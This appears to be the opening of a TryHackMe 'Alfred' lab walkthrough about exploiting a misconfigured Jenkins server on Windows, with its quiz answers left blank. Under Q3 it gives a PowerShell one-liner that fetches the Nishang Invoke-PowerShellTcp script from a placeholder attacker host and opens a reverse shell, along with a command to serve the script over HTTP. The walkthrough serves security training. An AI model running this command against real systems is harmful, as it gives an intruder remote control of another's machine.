## Walkthrough
[https://tryhackme.com/room/alfred](https://tryhackme.com/room/alfred)

**Difficulty level:** Easy

## Task 1: Initial Acess
In this room, we'll learn how to exploit a common misconfiguration on a widely used automation server(Jenkins - This tool is used to create continuous integration/continuous development pipelines that allow developers to automatically deploy their code once they made changes to it). After which, we'll use an interesting privilege escalation method to get full system access. 

Since this is a Windows application, we'll be using [Nishang](https://github.com/samratashok/nishang) to gain initial access. The repository contains a useful set of scripts for initial access, enumeration and privilege escalation. In this case, we'll be using the [reverse shell scripts](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)


### Questions

Q1. How many ports are open? (TCP only)

> ""

Q2. What is the username and password for the login panel? (in the format username:password)

> ""

Q3. Find a feature of the tool that allows you to execute commands on the underlying system. When you find this feature, you can use this command to get the reverse shell on your machine and then run it: powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port

You first need to download the Powershell script and make it available for the server to download. You can do this by creating an http server with python: python3 -m http.server
